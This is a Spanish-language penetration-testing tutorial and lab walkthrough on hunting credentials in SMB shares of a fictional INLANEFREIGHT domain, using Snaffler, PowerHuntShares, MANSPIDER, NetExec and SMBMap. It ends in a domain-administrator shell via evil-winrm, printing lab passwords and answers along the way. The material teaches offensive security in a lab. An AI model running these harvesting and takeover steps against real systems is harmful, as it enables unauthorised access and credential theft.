
# Credential Hunting en recursos compartidos

Casi todos los entornos corporativos incluyen recursos compartidos de red que los empleados utilizan para almacenar y compartir archivos entre equipos. Si bien estas carpetas compartidas son esenciales, pueden convertirse involuntariamente en una mina de oro para los atacantes, especialmente cuando se olvidan datos confidenciales como credenciales de texto plano o archivos de configuración. En esta sección, exploraremos cómo buscar credenciales en recursos compartidos de red de sistemas Windows y Linux mediante herramientas comunes, junto con técnicas generales que los atacantes utilizan para descubrir secretos ocultos.

#### **Patrones de credenciales comunes**

Antes de profundizar en herramientas especializadas, es importante comprender los tipos de patrones y formatos de archivo que suelen revelar información confidencial. Esto se abordó en secciones anteriores, por lo que no lo repetiremos en detalle aquí. Sin embargo, a modo de recordatorio rápido, aquí hay algunos consejos generales:

* Busque palabras clave dentro de archivos como `passw`, `user`, `token`, `key`, y `secret`.
* Busque archivos con extensiones comúnmente asociadas con credenciales almacenadas, como `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, y `.bat`.
* Esté atento a los archivos con nombres "interesantes" que incluyan términos como `config`, `user`, `passw`, `cred`, o `initial`.
* Si está intentando localizar credenciales dentro del `INLANEFREIGHT.LOCAL`dominio, puede ser útil buscar archivos que contengan la cadena `INLANEFREIGHT\`.
* Las palabras clave deben localizarse en función del objetivo; si estás atacando a una empresa alemana, es más probable que hagan referencia a un `"Benutzer"`que a un `"User"`.
* Presta atención a las acciones que estás considerando y sé estratégico. Si escaneas diez acciones con miles de archivos cada una, te llevará mucho tiempo. Las acciones utilizadas por otros `IT employees`podrían ser un objetivo más valioso que las utilizadas para fotos de empresas.

Con todo esto en mente, puede que le convenga comenzar con búsquedas básicas en la línea de comandos (p. ej., `Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...`) antes de ampliar a herramientas más avanzadas. Veamos cómo podemos usar `MANSPIDER`, `Snaffler`, `SnafflePy`y `NetExec`para automatizar y mejorar este proceso de búsqueda de credenciales.

***

## <mark style="color:purple;">Credential Hunting desde Windows</mark>

### **Snaffler**

La primera herramienta que abordaremos es [Snaffler](https://github.com/SnaffCon/Snaffler) . Se trata de un programa en C# que, al ejecutarse en una `domain-joined`máquina, identifica automáticamente los recursos compartidos de red accesibles y busca archivos interesantes. El `README`archivo del repositorio de Github describe las numerosas opciones de configuración con gran detalle; sin embargo, se puede realizar una búsqueda básica de la siguiente manera:

```cmd-session
c:\Users\Public> Snaffler.exe -s

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:42Z [Info] Parsing args...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Parsed args successfully.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting DFS paths from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Found 0 DFS Shares in 0 namespaces.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking full domain computer discovery.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Got 1 computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Starting to look for readable shares...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Created all sharefinder tasks.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\ADMIN$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\ADMIN$>(R) Remote Admin
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\C$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\C$>(R) Default share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Company>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Finance>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\HR>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\IT>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Marketing>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\NETLOGON>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Sales>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\SYSVOL>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:51Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:53Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:58Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\C$\Windows\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
<SNIP>
```

Todas las herramientas de esta sección generan una `gran cantidad de información`. Si bien facilitan la automatización, suele requerirse una revisión manual considerable, ya que muchas coincidencias pueden resultar ser `"false positives"`. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de Snaffler son:

* `-u` recupera una lista de usuarios de Active Directory y busca referencias a ellos en archivos
* `-i` y `-n` te permitirá especificar qué acciones deben incluirse en la búsqueda

### **PowerHuntShares**

Otra herramienta que se puede utilizar es [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) , un script de PowerShell que no necesita ejecutarse necesariamente en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un mensaje `reporte en HTML` al finalizar, lo que proporciona una interfaz de usuario intuitiva para revisar los resultados:

<figure><img src="/files/tNtj3PjXSpw9pxw9EuzO" alt=""><figcaption></figcaption></figure>

Podemos ejecutar un escaneo básico de `PowerHuntShares` de la siguiente manera:

```powershell
# Bypass de execution policy restrictions
Set-ExecutionPolicy -Scope Process Bypass

# Importar el módulo
Import-Module .\PowerHuntShares.psm1
```

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ===============================================================
 INVOKE-HUNTSMBSHARES
 ===============================================================
  This function automates the following tasks:

  o Determine current computer's domain
  o Enumerate domain computers
  o Check if computers respond to ping requests
  o Filter for computers that have TCP 445 open and accessible
  o Enumerate SMB shares
  o Enumerate SMB share permissions
  o Identify shares with potentially excessive privileges
  o Identify shares that provide read or write access
  o Identify shares thare are high risk
  o Identify common share owners, names, & directory listings
  o Generate last written & last accessed timelines
  o Generate html summary report and detailed csv files

  Note: This can take hours to run in large environments.
 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][05/01/2025 12:51] Scan Start
 [*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [*][05/01/2025 12:51] Successful connection to domain controller: DC01.inlanefreight.local
 [*][05/01/2025 12:51] Performing LDAP query for computers associated with the inlanefreight.local domain
 [*][05/01/2025 12:51] -  computers found
 [*][05/01/2025 12:51] - 0 subnets found
 [*][05/01/2025 12:51] Pinging  computers
 [*][05/01/2025 12:51] -  computers responded to ping requests.
 [*][05/01/2025 12:51] Checking if TCP Port 445 is open on  computers
 [*][05/01/2025 12:51] - 1 computers have TCP port 445 open.
 [*][05/01/2025 12:51] Getting a list of SMB shares from 1 computers
 [*][05/01/2025 12:51] - 11 SMB shares were found.
 [*][05/01/2025 12:51] Getting share permissions from 11 SMB shares
<SNIP>
```

***

## <mark style="color:purple;">Credential Hunting desde Linux</mark>

### **Manspider**

Si no tenemos acceso a un equipo unido al dominio, o simplemente preferimos buscar archivos de forma remota, herramientas como [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) nos permiten escanear recursos compartidos SMB desde Linux. Es recomendable ejecutarlo usando el contenedor Docker oficial para evitar problemas de dependencias. Al igual que otras herramientas, `MANSPIDER` ofrece numerosos parámetros configurables para afinar la búsqueda. Un escaneo básico de archivos que contengan la cadena `passw` se puede ejecutar de la siguiente manera:

```shell-session
afsh4ck@kali$ manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
[+] 10.129.234.121: Successful login as "mendres"
<SNIP>
```

#### Instalación

```bash
pip install pipx
pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
```

### **NetExec**

Además de sus muchos otros usos, `NetExec` también se puede usar para buscar en recursos compartidos de red con esta opción `--spider`. Esta función se describe detalladamente en la [wiki oficial](https://www.netexec.wiki/smb-protocol/spidering-shares) . Se puede ejecutar un análisis básico de los recursos compartidos de red en busca de archivos que contengan la cadena `"passw"` de la siguiente manera:

&#x20; Búsqueda de credenciales en recursos compartidos de red

```shell-session
afsh4ck@kali$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.175.36

RDP con el usuario "mendres" y la contraseña "Inlanefreight2025!"
```

Utilice las credenciales `mendres:Inlanefreight2025!` para conectarse al objetivo, ya sea mediante RDP o WinRM, y luego use las herramientas y técnicas enseñadas en esta sección para responder las preguntas a continuación. Para su conveniencia, `Snaffler` y `PowerHuntShares` se encuentran en `C:\Users\Public`.

### Pregunta 1

> Uno de los recursos compartidos a los que Mendres tiene acceso contiene credenciales válidas de otro usuario del dominio. ¿Cuál es su contraseña?

Nos conectamos por RDP al objetivo:

```bash
xfreerdp /v:10.129.234.173 /u:mendres /p:Inlanefreight2025! /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Una vez dentro si abrimos una Powershell y vamos a la ruta `C:\Users\Public` veremos las herramientas `Snaffler` y `PowerHuntShares`:

```powershell
PS C:\Users\public> ls

    Directory: C:\Users\public

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         5/1/2025  12:36 PM                Documents
d-r---         5/1/2025  12:36 PM                Music
d-r---         5/1/2025  12:36 PM                Pictures
d-----         5/1/2025  11:37 AM                PowerHuntShares
d-r---         5/1/2025  12:36 PM                Videos
-a----         5/1/2025  11:36 AM         491520 Snaffler.exe
```

Ejecutaremos Snaffler a ver que encuentra:

```powershell
PS C:\Users\public> ./Snaffler.exe -s
```

Eso nos genera una gran cantidad de información, por lo que usaremos otras técnicas para facilitarnos el análisis:

<figure><img src="/files/AozDBISyEgvRJT2fwFSe" alt=""><figcaption></figcaption></figure>

#### Análisis con SMBMap

```bash
smbmap -u mendres -p 'Inlanefreight2025!' -H 10.129.175.36

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
                     
[+] IP: 10.129.175.36:445	Name: 10.129.175.36       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Company                                           	READ ONLY	
	Finance                                           	NO ACCESS	
	HR                                                	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	Marketing                                         	NO ACCESS	
	NETLOGON                                          	READ ONLY	Logon server share 
	Sales                                             	NO ACCESS	
	SYSVOL                                            	READ ONLY	Logon server share 
```

Encontramos varios recursos compartidos a los que tenemos acceso de lectura.

#### ENumeración de usuarios del dominio

```
nxc smb 10.129.175.36 -u mendres -p 'Inlanefreight2025!' --users

SMB         10.129.175.36   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.175.36   445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.175.36   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.175.36   445    DC01             Administrator                 2025-05-01 08:02:13 0       Built-in account for administering the computer/domain
SMB         10.129.175.36   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.175.36   445    DC01             krbtgt                        2025-05-01 07:34:27 0       Key Distribution Center Service Account
SMB         10.129.175.36   445    DC01             mendres                       2025-05-01 08:10:43 0        
SMB         10.129.175.36   445    DC01             jbader                        2025-05-01 08:45:19 0        
SMB         10.129.175.36   445    DC01             lfrank                        2025-05-01 08:33:21 0        
SMB         10.129.175.36   445    DC01             wmoody                        2025-05-01 08:34:00 0        
SMB         10.129.175.36   445    DC01             dgreen                        2025-05-01 08:34:30 0        
SMB         10.129.175.36   445    DC01             mpetrova                      2025-05-01 08:35:02 0        
SMB         10.129.175.36   445    DC01             hfranz                        2025-05-01 08:35:34 0        
SMB         10.129.175.36   445    DC01             rdescartes                    2025-05-01 08:36:03 0        
SMB         10.129.175.36   445    DC01             pmuller                       2025-05-01 08:36:34 0        
SMB         10.129.175.36   445    DC01             smartin                       2025-05-01 08:37:00 0        
SMB         10.129.175.36   445    DC01             wbrown                        2025-05-01 08:37:28 0        
SMB         10.129.175.36   445    DC01             ffitzpatrick                  2025-05-01 08:38:02 0        
SMB         10.129.175.36   445    DC01             [*] Enumerated 15 local users: INLANEFREIGHT
```

Los guardaremos en un archivo users.txt:

```bash
cat > users.txt <<EOF
jbader
lfrank
wmoody
dgreen
mpetrova
hfranz
rdescartes
pmuller
smartin
wbrown
ffitzpatrick
EOF
```

Ahora buscaremos credenciales en los recursos compartidos.

#### Descargar Shares en local con NetExec

Añadiendo la flag `-M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60`  nos descargará en local el contenido de los shares para enumerarlos fácilmente:

```bash
nxc smb 10.129.175.36 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60

SMB         10.129.175.36   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.175.36   445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SPIDER_PLUS 10.129.175.36   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.175.36   445    DC01             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.175.36   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.175.36   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.175.36   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.175.36   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.175.36   445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.175.36   445    DC01             [*] Enumerated shares
SMB         10.129.175.36   445    DC01             Share           Permissions     Remark
SMB         10.129.175.36   445    DC01             -----           -----------     ------
SMB         10.129.175.36   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.175.36   445    DC01             C$                              Default share
SMB         10.129.175.36   445    DC01             Company         READ            
SMB         10.129.175.36   445    DC01             Finance                         
SMB         10.129.175.36   445    DC01             HR              READ            
SMB         10.129.175.36   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.175.36   445    DC01             IT              READ            
SMB         10.129.175.36   445    DC01             Marketing                       
SMB         10.129.175.36   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.175.36   445    DC01             Sales                           
SMB         10.129.175.36   445    DC01             SYSVOL          READ            Logon server share 
```

Ahora navegamos a la ruta:

```bash
cd /home/kali/.nxc/modules/nxc_spider_plus/10.129.175.36
```

Y filtramos con grep para extraer credenciales:

```bash
grep -ri "passw" .
```

O el siguiente comando para buscar intentos de autenticación contra el dominio:

```bash
grep -ri "INLANEFREIGHT" .

./IT/Tools/split_tunnel.txt:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
```

Bingo! Obtenemos las credenciales de un usuario del dominio:

```
jbader:ILovePower333###
```

### Pregunta 2

> Como este usuario, busque entre los recursos compartidos adicionales a los que tiene acceso e identifique la contraseña de un administrador de dominio. ¿Qué es?

Este usuario vemos que tiene más permisos (lectura y escritura) de SMB, por lo que puede acceder a más información que el usuario `mendres`:

```bash
smbmap -u jbader -p 'ILovePower333###' -H 10.129.175.36

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.175.36:445	Name: 10.129.175.36       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Company                                           	READ, WRITE	
	Finance                                           	READ, WRITE	
	HR                                                	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	Marketing                                         	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share 
	Sales                                             	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
```

#### Enumeración con las nuevas credenciales

Volveremos a ejecutar netexec con las nuevas credenciales para buscar más información y nuevas credenciales:

```bash
nxc smb 10.129.175.36 -u jbader -p ILovePower333### -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

Al filtrar con grep por "`passwd`" encontramos unas credenciales de un administrador:

```bash
grep -ri "passw" .
                                                                        
./HR/Public/Onboarding_Docs_485.docx:password=HRrocks2025!
./HR/Confidential/Onboarding_Docs_132.txt:**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`  
./Company/Forms/Security_Notice_1.docx:password=Form@1234
./Company/Forms/Incident_Report_57.xlsx:password=Summer2023!
./Company/Forms/Internal_Template_36.docx:password: SecureDocs99
./Company/Forms/HR_Form_14.pdf:password: SecureDocs99
./Company/Templates/IT_Guideline_54.pdf:password=Summer2023!
./Company/Templates/Policy_Update_15.txt:password=Summer2023!
./Company/Templates/Expense_Claim_10.xlsx:passwd=Draft456!
```

Si leemos el archivo Onboarding\_Docs\_132.txt observamos que el usuario es Administrator, con lo que habría quedado totalmente comprometido:

```bash
cat ./HR/Confidential/Onboarding_Docs_132.txt 

========================================
Employee Onboarding Checklist
========================================

Name: Josh Bader  
Start Date: 2025-04-29  
Department: IT Infrastructure  
Manager: R. Lawson  
Title: Systems Engineer III  
Role Level: Tier-0 Admin  

Checklist:
[✔] AD Account Created  
[✔] Email Provisioned  
[✔] Assigned to Admin VPN Group  
[✔] Azure Admin Portal Access  
[✔] Exchange Online Admin  
[✔] Domain Admin Rights Applied  

Notes:
Jordan will be responsible for oversight of Active Directory replication, GPO management, and DC patching. Temporarily granted access to the domain administrator account for initial 90 days to complete infrastructure tasks related to the Chicago DC migration.

Account credentials
**Username:** `Administrator`  
**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`
```

Y nos podemos conectar por `EvilWinRM` para comprobarlo:

```bash
evil-winrm -i 10.129.175.36 -u Administrator -p 'Str0ng_Adm1nistrat0r_P@ssword_2025!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                   
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator
```
